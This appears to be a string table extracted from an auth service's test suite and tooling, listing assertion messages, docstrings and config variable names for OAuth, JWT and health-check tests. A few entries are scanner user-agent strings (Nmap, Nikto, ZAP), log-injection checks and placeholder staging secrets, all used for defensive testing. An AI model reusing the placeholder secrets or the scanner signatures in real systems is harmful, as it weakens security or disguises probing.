    "Fix: Change _determine_urls()[1] to _determine_urls()[0] in auth_routes.py lines 242, 676, 906",
    "Fixed",
    "Fixed UserPlan import with placeholder enum",
    "Fixed UserSession import to use Session alias",
    "Fixed WebSocketConnectionManager import to use ConnectionManager",
    "Fixed decorator spacing in",
    "Fixed duplicate import in",
    "Fixed import order",
    "Fixed imports in:",
    "Fixed invalid syntax:",
    "Fixed syntax in:",
    "Fixed syntax issues in:",
    "Fixed unmatched parens:",
    "Fixed:",
    "Fixes Applied:",
    "Fixes made:",
    "Fixing",
    "Fixing Authentication Test Tokens",
    "Fixing Test Files:",
    "Fixing import issues...",
    "Fixing test discovery paths...",
    "Fixing test runner configuration...",
    "Fixtures Tests - Split from test_oauth_flows.py",
    "Fixtures:",
    "For",
    "For detailed guidance:",
    "For migrations:",
    "For psycopg2:",
    "Forbidden permission found:",
    "Force kill without confirmation",
    "Found",
    "Found Alembic config:",
    "Found potential migration directory:",
    "Found similar names in module:",
    "Found syntax error in:",
    "Four concurrent attempts should fail, got",
    "Frontend API Proxy",
    "Frontend API proxy is configured",
    "Frontend API proxy test failed:",
    "Frontend Health",
    "Frontend Startup Tests",
    "Frontend Tests:",
    "Frontend URL incorrectly contains 'auth.' subdomain:",
    "Frontend URL:",
    "Frontend URLs should NOT be in Google Console redirect URIs",
    "Frontend application tests",
    "Frontend health check failed:",
    "Frontend is serving",
    "Frontend port",
    "Frontend proxy returned status",
    "Frontend returned status",
    "Frontend should be in registry",
    "Frontend should have started",
    "Frontend token:",
    "Frontend:",
    "Full URL for debug:",
    "Full analysis saved to mock_analysis.json",
    "Full reports saved to test_reports/",
    "Full test suite (30-45min)",
    "Function",
    "Function '",
    "Function accepts *args, **kwargs and returns static data",
    "Function refactoring is disabled.",
    "Function/class",
    "Functions added:",
    "Functions exceeding",
    "Functions optimized:",
    "Functions:",
    "GC frequency",
    "GC pause:",
    "GCE_METADATA_HOST",
    "GCP_PROJECT_ID",
    "GCP_PROJECT_ID_NUMERICAL_STAGING",
    "GCP_REGION",
    "GEMINI_API_KEY",
    "GET",
    "GET / should work",
    "GET /auth/health should work",
    "GET /docs not available:",
    "GET /health should work",
    "GET /openapi.json not available:",
    "GITHUB_CLIENT_ID",
    "GITHUB_CLIENT_SECRET",
    "GITHUB_OAUTH_CLIENT_ID_STAGING",
    "GITHUB_OAUTH_CLIENT_SECRET_STAGING",
    "GITHUB_TOKEN",
    "GOOGLE OAUTH CONSOLE CONFIGURATION -",
    "GOOGLE OAUTH CONSOLE CONFIGURATION:\n===================================",
    "GOOGLE_CLIENT_ID",
    "GOOGLE_CLIENT_ID correctly detected as missing:",
    "GOOGLE_CLIENT_ID error:",
    "GOOGLE_CLIENT_ID=google-client-id-staging",
    "GOOGLE_CLIENT_SECRET",
    "GOOGLE_CLIENT_SECRET correctly detected as missing:",
    "GOOGLE_CLIENT_SECRET error:",
    "GOOGLE_CLOUD_PROJECT",
    "GOOGLE_OAUTH_CLIENT_ID_STAGING",
    "GOOGLE_OAUTH_CLIENT_SECRET_STAGING",
    "General disposal failure",
    "Generate Business Value Test Coverage Index",
    "Generate HTML test report",
    "Generate JSON test report",
    "Generate auto-split suggestions",
    "Generate comprehensive fix report",
    "Generate comprehensive test organization audit\n\nBusiness Value Justification (BVJ):\n1. Segment: Platform/Internal\n2. Business Goal: Development Velocity\n3. Value Impact: Identifies test organization issues blocking development\n4. Strategic Impact: Reduces development friction by 50%",
    "Generate detailed report",
    "Generate intelligent recommendations",
    "Generate intelligent test based on code analysis",
    "Generate report from existing scan results",
    "Generate splitting suggestions",
    "Generated URL:",
    "Generated async URL:",
    "Generated by auto_fix_test_violations.py",
    "Generated sync URL:",
    "Generated tokens:",
    "Generated:",
    "Generating tests for",
    "Get active sessions for user",
    "Get all sessions for a user",
    "Get test session using SSOT auth_db - preferred method",
    "Get test session using canonical auth_db - SSOT compliant",
    "Get user by ID from database",
    "Get user by email from database",
    "Git mv error:",
    "Git mv failed:",
    "GitHub User",
    "GitHub token required",
    "Google Client ID missing error not detected: '",
    "Google Client ID should be valid length, got",
    "Google Client Secret missing error not detected: '",
    "Google Client Secret should be valid length, got",
    "Google OAuth Console configuration documented",
    "Google OAuth Flow Tests - Business Impact\n\nRevenue Impact: $100K+ MRR Enterprise Google SSO\n- Enables Google SSO for Enterprise customers requiring Google Workspace integration\n- Validates complete Google OAuth flow for Enterprise authentication\n- Critical for Enterprise deals requiring Google SSO compliance\n\nTechnical Excellence:\n- Google OAuth initiation: authorization URL generation with proper security\n- Token exchange: secure Google token validation and error handling\n- User profile mapping: comprehensive Google user information integration\n- Scope validation: minimal privilege principle and security compliance\n- State security: CSRF protection and OAuth security best practices\n- Concurrent handling: scalable Google OAuth for Enterprise user loads\n\nEnterprise Readiness:\n- Enterprise: Google SSO compliance for $100K+ Google Workspace contracts\n- Security: OAuth state validation and secure Google token handling\n- Performance: Concurrent Google OAuth request handling for Enterprise scale\n- Integration: Complete Google user profile mapping and account management\n- Compliance: Google OAuth security standards for enterprise authentication",
    "Google OAuth Flow Tests - Google SSO integration for auth service\n\nTests complete Google OAuth flow including initiation, callback handling, token exchange,\nand user information retrieval. Critical for Enterprise Google SSO requirements.\n\nBusiness Value Justification (BVJ):\n- Segment: Enterprise | Goal: Google SSO | Impact: $100K+ MRR\n- Enables Google SSO for Enterprise customers requiring Google Workspace integration\n- Validates complete Google OAuth flow for Enterprise authentication\n- Critical for Enterprise deals requiring Google SSO compliance\n\nTest Coverage:\n- Google OAuth initiation and authorization URL generation\n- Google OAuth callback handling and token exchange\n- Google user information retrieval and profile creation\n- Google OAuth error scenarios and edge cases\n- Google SSO integration validation for Enterprise requirements",
    "Google OAuth callback endpoint missing, got:",
    "Google OAuth cannot complete if callback endpoint doesn't exist",
    "Google OAuth will fail if callback endpoint returns 404",
    "Google should be a supported OAuth provider",
    "GoogleHC/1.0",
    "Graceful degradation has critical problems:",
    "Graceful degradation test failed:",
    "Graceful degradation working: degraded=",
    "Graceful shutdown took too long:",
    "HEAD",
    "HEAD / should indicate JSON content:",
    "HEAD / should return 200, got",
    "HEAD /auth/health should return 200, got",
    "HEAD /docs should return 200, got",
    "HEAD /health should return 200 (monitoring compatibility), got",
    "HEAD /health should return 200, got",
    "HEAD /openapi.json should have JSON Content-Type:",
    "HEAD /openapi.json should return 200, got",
    "HEAD Content-Type should indicate JSON:",
    "HEAD health check failed for monitoring system",
    "HEAD method should be supported on /auth/health, got:",
    "HEAD method should be supported on /auth/login, got:",
    "HEAD response should be empty, got:",
    "HEAD response should have empty body",
    "HEAD response should have no body, got:",
    "HEAD should match GET status on health endpoint",
    "HEAD should match GET status. GET:",
    "HIGH",
    "HMAC secret test: '",
    "HMAC signature verification failed",
    "HOSTNAME",
    "HS256",
    "HS384",
    "HS512",
    "HTTP method monitoring compatibility tests for auth service.\n\nThese tests target the 405 Method Not Allowed errors seen in staging logs\nwhen monitoring systems use HEAD requests on health endpoints. Monitoring\nsystems commonly use HEAD requests to check endpoint availability without\ndownloading response bodies.",
    "Handler initialization failed:",
    "Hardcoded test data pattern found:",
    "Has",
    "Has TCP config:",
    "Hash should be much longer than original password",
    "Hash should contain memory parameter",
    "Hash should contain parallelism parameter",
    "Hash should contain time parameter",
    "Hash should not contain the original password",
    "Health Endpoints",
    "Health check #",
    "Health check correctly failed due to postgres database error",
    "Health check correctly failed for",
    "Health check correctly timed out on slow database",
    "Health check doesn't indicate degraded state. Missing indicators:",
    "Health check doesn't provide recovery validation:",
    "Health check doesn't validate migration state for issue:",
    "Health check failed for",
    "Health check missing monitoring fields:",
    "Health check passed",
    "Health check reports database is ready when 'netra_dev' doesn't exist. Health checks must validate actual database connectivity.",
    "Health check reports healthy despite",
    "Health check reports healthy despite cascade failures:",
    "Health check reports healthy during",
    "Health check reports healthy in",
    "Health check reports healthy without validating database connectivity. When netra_dev database is inaccessible, health check should fail.",
    "Health check reports healthy without validating database schema. Missing required tables should cause health check to fail.",
    "Health check reports healthy without validating database transaction capabilities. When database transactions fail, health should reflect this issue.",
    "Health check should succeed quickly",
    "Health check took too long for monitoring systems:",
    "Health checks pass for auth service",
    "Health checks took too long:",
    "Health endpoint correctly failed due to database issues:",
    "Health endpoint reports 'healthy' without validating database connectivity. When netra_dev database is inaccessible, health should report unhealthy.",
    "Health endpoint reports healthy without database validation. Basic health:",
    "Health endpoint returned",
    "Health endpoint returned status",
    "Health endpoint returns 'healthy' without validating database connectivity. When 'netra_dev' doesn't exist, health should report unhealthy status.",
    "Health endpoint should allow GET method:",
    "Health endpoint should allow HEAD method:",
    "Health endpoint test failed",
    "Health endpoint test failed:",
    "Health endpoint test passed:",
    "Health response missing field:",
    "Healthy",
    "Heap size:",
    "Hello, can you help me optimize my AI workload?",
    "Help text should display successfully",
    "Helper functions:",
    "Helper method extraction not yet implemented for",
    "High",
    "High - Agent system",
    "High - Services",
    "High - WebSocket",
    "High Failure Rate Tests:",
    "High timeout rate (",
    "Highly Similar:",
    "Hint:",
    "Host:",
    "Hostname:",
    "ID token issued too long ago should be rejected",
    "ID token with wrong issuer should be rejected",
    "IMPLEMENTATION:\n- Add OAuth configuration validation to health checks\n- Monitor OAuth authentication success rates  \n- Alert on OAuth redirect URI misconfigurations\n- Dashboard for OAuth authentication metrics\n- Automated testing of OAuth flow end-to-end\n\nCRITICAL ALERTS:\n- OAuth redirect URI using frontend URL (CRITICAL)\n- OAuth callback endpoints returning 404 (HIGH)\n- OAuth authentication success rate < 90% (HIGH)\n- 'No token received' errors increasing (MEDIUM)",
    "IMPLEMENTATION:\n- Create script: scripts/validate_oauth_configuration.py  \n- Run before every deployment to staging/production\n- Fail deployment if any validation check fails\n- Include in CI/CD pipeline as mandatory check\n- Test against actual deployed environments\n\nUSAGE:\npython scripts/validate_oauth_configuration.py --env staging\npython scripts/validate_oauth_configuration.py --env production --strict",
    "INFO",
    "INSERT",
    "INSTANCE_CONNECTION_NAME",
    "INSTANCE_ID",
    "INTEGRATION TEST: Test actual database connection with staging-like credentials.\n        \n        This test validates that properly configured staging credentials would\n        allow successful database connection (mocked for testing).",
    "INTEGRATION TEST: Test database connection failure with invalid credentials.\n        \n        This test validates that invalid staging credentials properly fail\n        connection attempts with appropriate error messages.",
    "ISSUE IDENTIFIED:",
    "ITERATION",
    "ITERATIONS",
    "Identify gaps in test coverage",
    "Impact:",
    "Implement memory monitoring and alerting",
    "Implement memory optimization",
    "Implement real functionality or remove unused function",
    "Import error (expected in test environment):",
    "Import error:",
    "Import fixes applied:",
    "Import resolution failed:",
    "Import test failed. Please fix the import errors above.",
    "Import test interrupted by user",
    "Import validation failed:",
    "ImportError",
    "ImportError: cannot import name '(\\w+)' from '([\\w\\.]+)'",
    "Improve error handling",
    "In-progress request cancelled - no graceful shutdown",
    "In-progress request failed during shutdown:",
    "In-progress request terminated abruptly - no graceful shutdown",
    "Include",
    "Incomplete OAuth config '",
    "Incomplete config",
    "Incomplete user information",
    "Inconsistent internal SSL handling: _normalize=",
    "Incorrect frontend URL:",
    "Increase real LLM test coverage from",
    "Increase test coverage for critical component '",
    "Initial login failed",
    "Initialization #",
    "Initialization order test failed:",
    "Initialization should fail with invalid database URL",
    "InitializationManager",
    "Initializing database...",
    "Initiate graceful shutdown of auth service",
    "Insights enabling optimization decisions for",
    "Install dependencies if missing",
    "Install with: pip install cloud-sql-python-connector[asyncpg]",
    "Installing frontend dependencies...",
    "Insufficient scope for user info",
    "Integration Tests",
    "Integration test has",
    "Integration tests for Redis connection failover and resilience\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Service reliability and graceful degradation\n- Value Impact: Ensures OAuth security works even when Redis fails\n- Strategic Impact: Prevents auth service outages during Redis failures\n\nThis test suite validates:\n1. Redis connection establishment and health checks\n2. Graceful fallback to in-memory storage when Redis unavailable\n3. Connection recovery after Redis becomes available\n4. OAuth security functionality during Redis outages\n5. Memory cleanup and connection management",
    "Integration tests for component interaction",
    "Integration tests to replicate issues identified from auth service staging logs.\n\nThese tests are designed to FAIL initially to demonstrate the staging issues:\n1. HEAD method returns 405 on /health endpoint (monitoring compatibility issue)\n2. Database schema initialization not idempotent (UniqueViolationError warnings)",
    "Internal server error",
    "Invalid",
    "Invalid Cloud SQL format",
    "Invalid GOOGLE_CLIENT_ID format not detected: '",
    "Invalid GOOGLE_CLIENT_ID placeholder returned: '",
    "Invalid GOOGLE_CLIENT_SECRET placeholder returned: '",
    "Invalid JWT format: expected 3 parts, got",
    "Invalid JWT structure:",
    "Invalid UUID format:",
    "Invalid access token",
    "Invalid auth provider:",
    "Invalid authorization code",
    "Invalid base64 encoding in JWT part:",
    "Invalid base64url encoding in JWT part",
    "Invalid characters in state:",
    "Invalid characters test - Service ID: '",
    "Invalid config response:",
    "Invalid credentials",
    "Invalid email format:",
    "Invalid health response:",
    "Invalid input detected",
    "Invalid or malformed parameters",
    "Invalid permission format:",
    "Invalid rate limit remaining:",
    "Invalid service ID",
    "Invalid state should fail validation",
    "Invalid timeout '",
    "Invalid token",
    "Invalid token format",
    "Invalid tokens accepted when database is down",
    "Invalid username pattern 'user_pr-4' found in staging URL",
    "Is Cloud SQL:",
    "Isolation and multi-tenancy tests",
    "It is STRONGLY recommended to:",
    "Iteration",
    "Iterations with all tests passing:",
    "Iterations with failures:",
    "Iterations:",
    "Iterative test-fix loop script that runs tests and fixes failures in a loop.",
    "JSON report saved to",
    "JWT",
    "JWT Secret:",
    "JWT Secret: MISSING",
    "JWT Secret: OK - Configured (from",
    "JWT Token Decoding:",
    "JWT Token Generation:",
    "JWT Token Testing: [ERROR] Failed -",
    "JWT Validation Failures - Failing Tests\n\nTests that replicate JWT token validation failures found in staging.\nThese tests are designed to FAIL to demonstrate current problems.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Token validation reliability and security\n- Value Impact: Ensures JWT tokens validate correctly across services\n- Strategic Impact: Prevents authentication failures affecting all service communication\n\nKey Issues to Test:\n1. JWT token validation with proper secret configuration\n2. Handling of malformed tokens (not enough segments)\n3. Signature verification failures\n4. Cross-service token validation issues",
    "JWT Validation Tests - Auth Service Security Testing\n\nBusiness Value: Authentication security for cross-service communication\nTests JWT signature validation, claims requirements, and token revocation\n\nCRITICAL: Uses real JWT libraries (PyJWT) with proper security testing\nMaximum 300 lines enforced - focused on core JWT validation only",
    "JWT handling imports failed:",
    "JWT should validate across environments with consistent secret configuration",
    "JWT validation should succeed when auth service and backend use same secret",
    "JWT_ALGORITHM",
    "JWT_SECRET",
    "JWT_SECRET_KEY",
    "JWT_SECRET_KEY:",
    "JWT_SECRET_KEY=jwt-secret-key-staging",
    "JWT_SECRET_STAGING",
    "Jane Doe",
    "Job failed",
    "John Doe",
    "KEY",
    "KEY FINDING:",
    "K_REVISION",
    "K_SERVICE",
    "K_SERVICE=netra-backend:",
    "K_SERVICE=netra-prod-backend:",
    "K_SERVICE=netra-staging-backend:",
    "Key findings: Your AI workloads show 30% optimization potential.\n        Main bottlenecks: Memory allocation and network I/O.\n        Quick wins: Enable caching, batch requests, optimize prompts.\n        Estimated savings: $2,400/month with recommended changes.",
    "Key principles:",
    "Key should exist after setting",
    "Kill these processes? (y/n):",
    "Killed",
    "Killed PID",
    "Killing processes...",
    "Kubernetes/1.21 (linux/amd64) kubernetes/1c4c40c",
    "L1",
    "L2",
    "L3",
    "L3 pattern",
    "L3 test files",
    "LARGEST FILES:",
    "LARGEST FUNCTIONS:",
    "LIKELY CAUSE OF AUTH FAILURES:",
    "LLM Configurations:",
    "LLM Response Generator\n\nThis module generates realistic LLM responses with production-like characteristics.",
    "LLM initialization failed",
    "LLMManager()",
    "LLMResponseGenerator",
    "LOAD_SECRETS",
    "LOGIN_FAILED",
    "LOGIN_SUCCESS",
    "LOGOUT",
    "LOG_ASYNC_CHECKOUT",
    "LOG_LEVEL",
    "LONG_VALUE",
    "Large file (",
    "Length:",
    "Lib",
    "Line",
    "Line:",
    "Lint test files for real test requirements compliance",
    "List available categories and their configuration",
    "List processes only, don't kill",
    "List[",
    "Load balancer gets incorrect routing guidance:",
    "Load test reports from test_reports/.",
    "Loaded test environment from",
    "Loading configuration...",
    "Loading coverage data...",
    "Loading test results...",
    "Local Development",
    "Local OAuth Testing Script with Enhanced Debugging\nTests the complete OAuth flow locally with detailed logging\n\nThis script:\n1. Tests OAuth configuration\n2. Simulates OAuth login flow\n3. Validates token generation\n4. Checks auth service communication",
    "Local services started successfully",
    "Localhost in staging (should fail)",
    "Localhost:3000 should be allowed in development",
    "Location",
    "Log Data Generator\n\nThis module generates realistic log data with specific patterns and behaviors.",
    "Log injection payload included in error message:",
    "Log injection payload reflected in response:",
    "LogGenerator",
    "LogInjection",
    "Logged out",
    "Login failed with status",
    "Long Service ID test result:",
    "Long timeout",
    "Long-duration soak testing",
    "Low - Utilities",
    "MAJOR (should fix)",
    "MALFORMED.TOKEN.HERE",
    "MANUAL ACTION REQUIRED -",
    "MAX_LOGIN_ATTEMPTS",
    "MAX_SESSIONS_PER_USER",
    "MB",
    "MEDIUM",
    "MIGRATION TEST SUMMARY",
    "MINOR (nice to fix)",
    "MISSING",
    "MagicMock()",
    "MagicMock, MagicMock",
    "MagicMock\\(",
    "MagicMock\\(\\)",
    "Main",
    "Main entry point for optimized test execution",
    "Main entry point.",
    "Main test function.",
    "Main test runner",
    "MainTestSettings",
    "Malformed Service ID '",
    "Malformed token '",
    "Malformed token should be invalid:",
    "Malformed token should be rejected:",
    "Malicious sites should be blocked",
    "Many test failures are due to:",
    "Markdown report saved to",
    "Markers added:",
    "Maximum number of files to analyze",
    "Maximum number of files to process",
    "Maximum number of worker processes for Jest (frontend tests)",
    "Maximum token limit exceeded",
    "Medium - Integration",
    "Medium - Models",
    "Memory Intensive:",
    "Memory allocation failed, retrying",
    "Message flow test PASSED",
    "Message validation failed:",
    "Method '",
    "Method not found error:",
    "Methods should behave consistently across concurrent calls",
    "Metrics exported",
    "Migration Safety Checks",
    "Migration URL Generation",
    "Migration URL valid:",
    "Migration URL:",
    "Minimal output",
    "Minimal output for CI logs",
    "Minimum coverage percentage required (default: 70)",
    "MinimumLength8!",
    "Minor warning after deployment",
    "Missing GOOGLE_CLIENT_ID not detected in staging environment",
    "Missing GOOGLE_CLIENT_SECRET not detected in staging environment",
    "Missing HMAC secret",
    "Missing OAUTH_HMAC_SECRET not detected in staging environment",
    "Missing POSTGRES_DB correctly failed validation:",
    "Missing POSTGRES_DB created URL:",
    "Missing POSTGRES_DB defaults to problematic 'netra_staging':",
    "Missing POSTGRES_DB results in invalid URL:",
    "Missing all configuration",
    "Missing config file:",
    "Missing configs:",
    "Missing credentials",
    "Missing database",
    "Missing fixes:",
    "Missing method",
    "Missing password",
    "Missing permission:",
    "Missing rate limit header",
    "Missing rate limit remaining header",
    "Missing rate limit reset header",
    "Missing required field",
    "Missing required field in audit log:",
    "Missing required field in error response:",
    "Missing required field in login response:",
    "Missing required field:",
    "Missing required fields",
    "Missing required permission:",
    "Missing required staging credentials:",
    "Missing required staging variables",
    "Missing secret mappings:",
    "Missing setup_test_path import or call",
    "Missing test directory:",
    "Missing test file:",
    "Mobile App/1.0.0 (iOS 15.0)",
    "Mock component class '",
    "Mock component function '",
    "Mock component pattern found:",
    "Mock response",
    "Mock()",
    "Mock/test implementation comment found:",
    "MockAgent",
    "MockComponent\\s*=",
    "MockUser",
    "Mock\\(",
    "Mock\\(\\)",
    "Mock\\(spec=ToolDispatcher\\)",
    "Mocked exception",
    "Model inference completed",
    "Model loaded successfully",
    "Model response test failed:",
    "Modernize legacy test patterns",
    "Modernizing",
    "Modular test file created to comply with 450-line limit requirement.\nContains",
    "Module file not found:",
    "ModuleNotFoundError",
    "ModuleNotFoundError: No module named '([\\w\\.]+)'",
    "Monitor OAuth authentication success rates",
    "Monitor OAuth configuration consistency",
    "Monitor OAuth provider connectivity",
    "Monitoring systems can't detect degraded state. Missing capabilities:",
    "Most likely issues in staging environment:",
    "Move '",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 OWASP ZAP/2.11.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0.4472.124",
    "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)",
    "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:Port Check)",
    "Multi-Service Coverage:",
    "Multi-user productivity for",
    "N/A",
    "NEED TO IMPLEMENT:",
    "NETRA AI PLATFORM - BACKEND TEST RUNNER",
    "NETRA AI PLATFORM - COMPREHENSIVE TEST DISCOVERY REPORT",
    "NETRA AI PLATFORM - FRONTEND TEST RUNNER",
    "NETRA APEX UNIFIED TEST RUNNER\n==============================\nModern test runner with advanced categorization, progress tracking, and intelligent execution planning.\n\nUSAGE:\n    python unified_test_runner.py                       # Run default categories\n    python unified_test_runner.py --category unit       # Run specific category\n    python unified_test_runner.py --help                # Show all options\n\nCATEGORIES:\n    CRITICAL: smoke, startup\n    HIGH:     unit, security, database\n    MEDIUM:   integration, api, websocket, agent\n    LOW:      frontend, performance, e2e\n\nEXAMPLES:\n    python unified_test_runner.py --category unit\n    python unified_test_runner.py --categories unit api\n    python unified_test_runner.py --category performance --window-size 30\n    python unified_test_runner.py --list-categories",
    "NETRA_STAGING",
    "NO",
    "NOTE: Actual migration execution skipped for safety",
    "Need to increase coverage by",
    "Nested environment variable test - Service ID:",
    "Netra Auth Service",
    "Network configuration issue in Cloud Run",
    "Network connection FAILED:",
    "Network error",
    "Network partition detection took",
    "Network unreachable - simulated partition",
    "New access token should be generated",
    "New access token should be invalid after user blacklisting",
    "New files created:",
    "New files:",
    "New refresh token should be generated",
    "New refresh token should be invalid after user blacklisting",
    "Next Steps Guidance",
    "Next steps:",
    "Nikto",
    "Nmap NSE",
    "No .env.staging file",
    "No ACT compatibility checks found",
    "No API key",
    "No Alembic configuration found",
    "No Google Client ID found",
    "No Google Client Secret found",
    "No L3 files found!",
    "No SSL parameters as expected",
    "No access token received",
    "No async URL generated",
    "No authentication token",
    "No categories to run based on selection criteria",
    "No circuit breaker or rate limiting - requests timeout instead of proper 503 responses",
    "No clear user notification of reduced functionality",
    "No critical issues found. Test suite appears well-organized.",
    "No endpoint defined for",
    "No env vars set:",
    "No environment uses frontend URLs for OAuth redirects",
    "No error details",
    "No failing tests found!",
    "No failure scan found. Run test_failure_scanner.py first.",
    "No fake tests found",
    "No fallback mechanism for Auth Service 500 errors",
    "No fallback mechanism when Auth Service completely unresponsive",
    "No frontend URLs in OAuth redirect configuration",
    "No import changes were needed.",
    "No large test files found for demonstration",
    "No migrations",
    "No monitoring alert for degraded state",
    "No netra_backend imports found",
    "No network partition handling - connection failed after",
    "No priority failures found.",
    "No real e2e tests found",
    "No real e2e tests found.",
    "No redirect_uri in",
    "No redirect_uri in Google OAuth URL:",
    "No redirect_uri parameter found in Google OAuth URL",
    "No response from WebSocket",
    "No response received (expected due to auth)",
    "No scan performed - report only mode",
    "No setup_test_path import found",
    "No specific files identified for fixing",
    "No splitting suggestions needed!",
    "No state parameter in Google OAuth URL",
    "No sync URL generated",
    "No test file size violations found!",
    "No test files changed",
    "No test files found for category '",
    "No test function violations found!",
    "No test processes found running.",
    "No test processes found.",
    "No test violations found!",
    "No tests found",
    "No token provided",
    "No unauthorized redirect URIs in code",
    "Non-standard",
    "Nonce replay should be prevented",
    "None",
    "None  # Use real component",
    "None user ID should handle gracefully",
    "Normal deployment should not fail",
    "Normalized async:",
    "Normalized:",
    "Not Set",
    "Not all states were unique",
    "Not found",
    "Not in a git repository or git not available",
    "Not tested",
    "Note:",
    "Number of database users:",
    "Number of iterations",
    "Number of parallel workers (0=sequential, auto=auto, or number)",
    "Number of parallel workers (default: 4)",
    "OAUTH DEPLOYMENT VALIDATION CHECKLIST:\n=====================================",
    "OAUTH REDIRECT URI MONITORING REQUIREMENTS:\n==========================================",
    "OAUTH_CALLBACK",
    "OAUTH_CLIENT_ID",
    "OAUTH_CLIENT_SECRET",
    "OAUTH_ERROR",
    "OAUTH_HMAC_SECRET",
    "OAUTH_HMAC_SECRET correctly detected as missing:",
    "OAUTH_HMAC_SECRET error:",
    "OAUTH_HMAC_SECRET is empty in staging: '",
    "OAUTH_REDIRECT_URI",
    "OAUTH_REDIRECT_URL",
    "OAuth Callback",
    "OAuth Configuration",
    "OAuth Configuration Issues - Failing Tests\n\nTests that replicate OAuth configuration warnings and issues found in staging.\nThese tests are designed to FAIL to demonstrate current problems.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Service reliability and OAuth authentication availability\n- Value Impact: Ensures OAuth flows work correctly in staging/production\n- Strategic Impact: Prevents authentication breakdowns affecting all user tiers\n\nKey Issues to Test:\n1. OAuth configuration warnings - GOOGLE_CLIENT_ID vs GOOGLE_OAUTH_CLIENT_ID_STAGING naming mismatch\n2. Environment-specific OAuth variable handling\n3. OAuth secret validation and fallback behavior",
    "OAuth Configuration:",
    "OAuth Error Handling Tests - Business Impact\n\nRevenue Impact: $50K+ MRR Enterprise OAuth Reliability\n- Ensures robust OAuth error handling for Enterprise production deployments\n- Prevents OAuth failures that could block Enterprise customer authentication\n- Validates graceful error recovery and user experience during OAuth issues\n\nTechnical Excellence:\n- Invalid state handling: OAuth security validation and CSRF protection\n- Access denial scenarios: graceful user cancellation and error messaging\n- Token exchange failures: provider service failure recovery and error handling\n- User info failures: incomplete data handling and fallback mechanisms\n- Network resilience: timeout and connectivity error handling\n- Input validation: malformed request sanitization and security protection\n- Rate limiting: OAuth abuse prevention and service stability\n- CSRF protection: security compliance and attack prevention\n\nEnterprise Readiness:\n- Enterprise: Robust OAuth error handling for production Enterprise deployments\n- Security: CSRF protection and input validation for OAuth security compliance\n- Reliability: Network failure handling and service resilience for Enterprise SLA\n- User Experience: Graceful error handling and recovery for Enterprise users\n- Stability: Rate limiting and abuse prevention for OAuth service protection",
    "OAuth Error Handling Tests - OAuth error scenarios and edge case validation\n\nTests OAuth error handling scenarios including invalid state parameters, access denial,\ntoken exchange failures, and user information fetch failures for robust OAuth implementation.\n\nBusiness Value Justification (BVJ):\n- Segment: Enterprise | Goal: OAuth Reliability | Impact: $50K+ MRR\n- Ensures robust OAuth error handling for Enterprise production deployments\n- Prevents OAuth failures that could block Enterprise customer authentication\n- Validates graceful error recovery and user experience during OAuth issues\n\nTest Coverage:\n- OAuth invalid state parameter handling and security validation\n- OAuth access denial and user cancellation scenarios\n- OAuth token exchange failure handling and error recovery\n- OAuth user information fetch failure and fallback mechanisms\n- OAuth edge cases and malformed request handling",
    "OAuth Flow Tests for Auth Service (Synchronous)\nBasic testing of OAuth endpoints with TestClient",
    "OAuth HMAC secret missing error not detected: '",
    "OAuth ID Token Validation Tests - Business Impact\n\nSecurity Foundation: External Authentication Integration\n- Ensures secure OAuth ID token validation for external authentication providers\n- Validates token expiration, issuer verification, and security compliance\n- Critical foundation for social login and external authentication flows\n\nTechnical Excellence:\n- Valid token acceptance: ensures legitimate OAuth providers can authenticate users\n- Security validation: prevents expired, malformed, or malicious token acceptance\n- Provider flexibility: supports multiple OAuth providers (Google, GitHub, Microsoft)\n- Edge case handling: robust validation of timing boundaries and malformed inputs\n- Issuer verification: prevents token replay attacks from unauthorized providers\n\nPlatform Security:\n- Foundation: Secure external authentication foundation for social login flows\n- Security: Comprehensive OAuth validation prevents authentication bypasses\n- Provider Support: Multi-provider compatibility for flexible authentication options\n- Timing Security: Proper token age and expiration validation prevents stale token usage\n- Error Handling: Robust malformed token handling prevents authentication service crashes",
    "OAuth ID Token Validation Tests - Critical authentication infrastructure testing\n\nTests the validation of OAuth ID tokens from external providers (Google, GitHub, etc.).\nThis is a fundamental component missing test coverage for basic authentication flows.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Security | Goal: Auth Foundation | Impact: OAuth Integration\n- Ensures secure OAuth ID token validation for external authentication providers\n- Validates token expiration, issuer verification, and security compliance\n- Critical foundation for social login and external authentication flows\n\nTest Coverage:\n- Valid ID token validation with proper claims\n- Invalid ID token rejection (expired, malformed, wrong issuer)\n- Edge cases and error handling for malformed tokens\n- Security validation for token timing and structure",
    "OAuth Login Endpoint",
    "OAuth PKCE (Proof Key for Code Exchange) Validation Tests\nTests for RFC 7636 compliance and security vulnerabilities\n\nBusiness Value Justification (BVJ):\n- Segment: All (Free, Early, Mid, Enterprise)\n- Business Goal: Security, Compliance, OAuth Standards\n- Value Impact: Prevents authorization code interception attacks\n- Strategic Impact: Critical for OAuth security compliance and user trust\n\nPKCE Security Coverage:\n- Valid PKCE challenge validation\n- Invalid challenge rejection\n- Timing attack resistance\n- Malformed input handling\n- Edge case security validation",
    "OAuth Redirect URI Regression Prevention Test Suite\nTests to prevent future OAuth redirect URI misconfigurations\n\nThis test suite ensures that OAuth redirect URI configurations remain correct\nand prevents regression of the critical staging authentication failure.\n\nBusiness Value Justification (BVJ):\n- Segment: All customer segments\n- Business Goal: Platform Stability, Risk Reduction  \n- Value Impact: Prevents 100% OAuth authentication failure\n- Strategic Impact: Protects user acquisition and retention\n\nThese tests should PASS after the OAuth redirect URI fix is applied.\nIf any test fails, it indicates a regression that will break OAuth authentication.",
    "OAuth State CSRF Vulnerability Integration Tests\nTests for critical OAuth state management security flaws\n\nBusiness Value Justification (BVJ):\n- Segment: All (Free, Early, Mid, Enterprise)\n- Business Goal: Security, Compliance, CSRF Prevention\n- Value Impact: Prevents OAuth hijacking and CSRF attacks\n- Strategic Impact: CRITICAL security vulnerability that could compromise user accounts\n\nCRITICAL SECURITY ISSUE IDENTIFIED:\nThe initiate_oauth_login endpoint generates state parameters but doesn't store them\nfor later validation, creating a major CSRF vulnerability.\n\nThis test will FAIL to expose the security gap.",
